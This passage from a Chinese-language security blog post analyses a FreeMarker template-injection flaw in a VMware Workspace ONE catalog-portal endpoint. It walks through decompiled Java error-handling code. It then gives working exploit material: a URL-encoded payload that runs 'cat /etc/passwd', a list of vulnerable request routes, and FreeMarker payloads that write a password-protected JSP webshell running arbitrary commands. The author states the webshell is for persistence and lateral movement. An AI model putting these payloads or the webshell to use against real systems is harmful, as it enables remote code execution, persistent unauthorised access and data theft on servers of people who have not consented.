</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">handleAnyGenericException</span>(<span style="color:#66d9ef">final</span> HttpServletRequest request, <span style="color:#66d9ef">final</span> Exception ex) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> UiRequest uiRequest <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getUiRequest</span>(request);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">final</span> ResponseStatus responseStatus <span style="color:#f92672">=</span> (ResponseStatus)AnnotationUtils.<span style="color:#a6e22e">findAnnotation</span>((Class)ex.<span style="color:#a6e22e">getClass</span>(), (Class)ResponseStatus.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>        String errorResponse;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (responseStatus <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>            errorResponse <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolveException</span>(request, ex, uiRequest, <span style="color:#e6db74">&#34;server.unexpected.error&#34;</span>, HttpStatus.<span style="color:#a6e22e">INTERNAL_SERVER_ERROR</span>.<span style="color:#a6e22e">value</span>(), uiRequest.<span style="color:#a6e22e">getRequestId</span>());
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">final</span> MsgKey msgKey <span style="color:#f92672">=</span> (MsgKey)AnnotationUtils.<span style="color:#a6e22e">findAnnotation</span>((Class)ex.<span style="color:#a6e22e">getClass</span>(), (Class)MsgKey.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (msgKey <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>(ex <span style="color:#66d9ef">instanceof</span> LocalizationParamValueException)) {
</span></span><span style="display:flex;"><span>                errorResponse <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolveException</span>(request, ex, uiRequest, <span style="color:#e6db74">&#34;server.unmapped.message&#34;</span>, responseStatus.<span style="color:#a6e22e">value</span>().<span style="color:#a6e22e">value</span>(), uiRequest.<span style="color:#a6e22e">getRequestId</span>());
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                errorResponse <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">resolveException</span>(request, ex, uiRequest, msgKey.<span style="color:#a6e22e">value</span>(), responseStatus.<span style="color:#a6e22e">value</span>().<span style="color:#a6e22e">value</span>(), ((LocalizationParamValueException)ex).<span style="color:#a6e22e">getArgs</span>());
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> errorResponse;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>查看下如何控制<code>javax.servlet.error.message</code>，是通过<code>handleAnyGenericException</code>中的(LocalizationParamValueException)ex).getArgs()
<img src="/img/16534685569681/16534717140813.jpg" alt="">
这是一个自身args属性，只需要控制抛出异常的参数，就可以把freemarker的payload传入errorObj
<img src="/img/16534685569681/16534722071937.jpg" alt="">
继续查看在<code>com.vmware.endusercatalog.auth.interceptor.AuthContextPopulationInterceptor</code>的preHandle中authContextBuilder的build方法会抛出异常
<img src="/img/16534685569681/16534732040279.jpg" alt="">
<img src="/img/16534685569681/16534732672032.jpg" alt="">
其中isValidRequest代码如下，只需要让deviceId和deviceType其中一个为空一个不为空，即可抛出异常。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isValidRequest</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isBrowserRequest</span>() <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isNativeAppRequestWithAuthToken</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isBrowserRequest</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">deviceId</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">deviceType</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isBrowserRequestWithAuthToken</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isBrowserRequest</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">hasAuthorizationToken</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isNativeAppRequestWithAuthToken</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isRequestWithDeviceParams</span>() <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">hasAuthorizationToken</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isRequestWithDeviceParams</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">deviceId</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">deviceType</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">hasAuthorizationToken</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">authorizationToken</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>    }
</span></span></code></pre></div><p>所以只需要传入deviceUdid或deviceType的任意一个参数，然后使用freemarker的可执行代码的恶意类即可。</p>
<p><img src="/img/16534685569681/16534735043941.jpg" alt=""></p>
<h2 id="攻击方式">攻击方式<a href="#攻击方式" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>其他路由，也可以触发该漏洞</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">/</span>catalog<span style="color:#f92672">-</span>portal<span style="color:#f92672">/</span>ui<span style="color:#f92672">/</span>oauth<span style="color:#f92672">/</span>verify<span style="color:#960050;background-color:#1e0010">?</span>error<span style="color:#f92672">=&amp;</span>deviceUdid<span style="color:#f92672">=%</span><span style="color:#ae81ff">24</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>b<span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">66</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>b<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">72</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>d<span style="color:#f92672">%</span><span style="color:#ae81ff">70</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>c<span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">69</span><span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>c<span style="color:#f92672">%</span><span style="color:#ae81ff">69</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">79</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">45</span><span style="color:#f92672">%</span><span style="color:#ae81ff">78</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">63</span><span style="color:#f92672">%</span><span style="color:#ae81ff">75</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">6</span>e<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">77</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">63</span><span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">65</span><span style="color:#f92672">%</span><span style="color:#ae81ff">74</span><span style="color:#f92672">%</span><span style="color:#ae81ff">63</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>f<span style="color:#f92672">%</span><span style="color:#ae81ff">70</span><span style="color:#f92672">%</span><span style="color:#ae81ff">61</span><span style="color:#f92672">%</span><span style="color:#ae81ff">73</span><span style="color:#f92672">%</span><span style="color:#ae81ff">73</span><span style="color:#f92672">%</span><span style="color:#ae81ff">77</span><span style="color:#f92672">%</span><span style="color:#ae81ff">64</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>
</span></span><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>catalog<span style="color:#f92672">-</span>portal<span style="color:#f92672">/</span>ui<span style="color:#960050;background-color:#1e0010">?</span>deviceType<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>catalog<span style="color:#f92672">-</span>portal<span style="color:#f92672">/</span>hub<span style="color:#f92672">-</span>ui<span style="color:#960050;background-color:#1e0010">?</span>deviceType<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>catalog<span style="color:#f92672">-</span>portal<span style="color:#f92672">/</span>hub<span style="color:#f92672">-</span>ui<span style="color:#f92672">/</span>byob<span style="color:#960050;background-color:#1e0010">?</span>deviceType<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>catalog<span style="color:#f92672">-</span>portal<span style="color:#f92672">/</span>ui<span style="color:#f92672">/</span>oauth<span style="color:#f92672">/</span>verify<span style="color:#960050;background-color:#1e0010">?</span>deviceType<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>catalog<span style="color:#f92672">-</span>portal<span style="color:#f92672">/</span>ui<span style="color:#f92672">/</span>oauth<span style="color:#f92672">/</span>verify<span style="color:#960050;background-color:#1e0010">?</span>deviceType<span style="color:#f92672">=</span>
</span></span></code></pre></div><p><img src="/img/16534685569681/16534735150395.jpg" alt=""></p>
<p>可以命令执行了但是我们攻击时为了方便后续维权和横向，肯定要上webshell，通过如下语句即可写入内容。</p>
<h3 id="文件落地webshell">文件落地webshell<a href="#文件落地webshell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>${<span style="color:#e6db74">&#34;freemarker.template.utility.ObjectConstructor&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(<span style="color:#e6db74">&#34;java.io.FileOutputStream&#34;</span>,<span style="color:#e6db74">&#34;/opt/vmware/horizon/workspace/webapps/catalog-portal/shell.jsp&#34;</span>).<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;freemarker.template.utility.ObjectConstructor&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(<span style="color:#e6db74">&#34;java.lang.String&#34;</span>,<span style="color:#e6db74">&#34;test&#34;</span>).<span style="color:#a6e22e">getBytes</span>())}
</span></span></code></pre></div><p><img src="/img/16534685569681/16534777837927.jpg" alt=""></p>
<p><img src="/img/16534685569681/16534778832401.jpg" alt="">
写入webshell payload，记得url编码下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>${<span style="color:#e6db74">&#34;freemarker.template.utility.ObjectConstructor&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(<span style="color:#e6db74">&#34;java.io.FileOutputStream&#34;</span>,<span style="color:#e6db74">&#34;/opt/vmware/horizon/workspace/webapps/catalog-portal/shell.jsp&#34;</span>).<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;freemarker.template.utility.ObjectConstructor&#34;</span><span style="color:#f92672">?</span><span style="color:#66d9ef">new</span>()(<span style="color:#e6db74">&#34;java.lang.String&#34;</span>,<span style="color:#e6db74">&#34;&lt;% if(\&#34;023\&#34;.equals(request.getParameter(\&#34;pwd\&#34;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\&#34;i\&#34;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\&#34;&lt;pre&gt;\&#34;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\&#34;&lt;/pre&gt;\&#34;); } %&gt;&#34;</span>).<span style="color:#a6e22e">getBytes</span>())}
</span></span></code></pre></div><p><img src="/img/16534685569681/16534787672390.jpg" alt=""></p>

      </div></div>

  
    
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h"></span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="https://vuln.top/posts/my-first-post/">
                <span class="button__icon">←</span>
                <span class="button__text">MAC下微信浏览器可能可行的利用方式</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="https://vuln.top/posts/awd-flag-script/">
                <span class="button__text">AWD FLAG SCRIPT</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  
    
<div id="disqus_thread"></div>
<script>
    

    

    (function() { 
    var d = document, s = d.createElement('script');
    s.src = 'https://vuln-1.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
